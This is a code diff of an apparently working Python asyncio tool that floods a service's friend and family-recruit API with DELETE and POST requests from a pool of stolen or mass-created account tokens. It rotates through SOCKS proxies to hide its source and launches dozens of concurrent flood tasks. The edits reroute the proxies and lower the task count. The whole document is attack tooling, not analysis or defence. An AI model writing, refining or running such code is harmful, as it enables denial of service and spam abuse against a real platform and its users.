@@ -16,7 +16,6 @@ from Crypto.Cipher import AES, PKCS1_v1_5
 from Crypto.Util.Padding import pad
 from Crypto.PublicKey import RSA
 from aiohttp_socks import ProxyConnector
-from PyRoxy import ProxyChecker, ProxyUtiles
 
 #PROXY_WORK = [f"socks5://127.0.0.1:{port}" for port in range(9001, 9032)]
 PROXY_WORK = [
@@ -356,14 +355,9 @@ async def main():
     ) as session:
         asyncio.create_task(update_endpoints(session))
         asyncio.create_task(cdn(session))
-        asyncio.create_task(proxies(session))
+        #asyncio.create_task(proxies(session))
        # asyncio.create_task(vless(session))
     #    await asyncio.sleep(200)
-        while True:
-            if not SOCKS:
-                await asyncio.sleep(0.01)
-                continue
-            break
         while True:
             if not DATA_CENTERS:
                 await asyncio.sleep(0.01)
@@ -376,7 +370,7 @@ async def main():
         await asyncio.sleep(9999999999999999999999999999999999999999)
 
 ACCOUNTS = []
-ABUSE = []
+ABUSE = {}
 
 async def cr(session, lock):
     global ABUSE
@@ -554,7 +548,8 @@ async def flood_s(session, lock):
         while True:
             if not ACCOUNTS:
                 continue
-            async with aiohttp.ClientSession(connector=ProxyConnector.from_url(random.choice(SOCKS), ssl=False, limit=0)) as session:
+          #  async with aiohttp.ClientSession(connector=ProxyConnector.from_url(random.choice(SOCKS), ssl=False, limit=0)) as session:
+            if "kr" == "kr":
                 account = random.choice(ACCOUNTS)
                 user_id, token, android_id, register_time, device_register_time = account.split(":")
                 nonce = str(uuid.uuid4())
@@ -565,6 +560,7 @@ async def flood_s(session, lock):
                     async with session.delete(
                         f"https://{random.choice(DATA_CENTERS)}/friend/api/v1/family/recruit",
                         timeout=2,
+                        proxy=random.choice(PROXY_WORK),
                         headers={
                             "userId": user_id,
                             "packageName": "official",
@@ -612,6 +608,7 @@ async def flood_s(session, lock):
                         f"https://{random.choice(DATA_CENTERS)}/friend/api/v1/family/recruit",
                         data=body_string.encode(),
                         timeout=2,
+                        proxy=random.choice(PROXY_WORK),
                         headers={
                             "language": region,
                             "userId": user_id,
@@ -651,7 +648,7 @@ async def flood_s(session, lock):
                 except Exception as e:
                     print(e)
 
-    tasks = [asyncio.create_task(flood_k()) for _ in range(100)]
+    tasks = [asyncio.create_task(flood_k()) for _ in range(50)]
     await asyncio.gather(*tasks)
 
 async def clan_flood(session, clan_id, region):
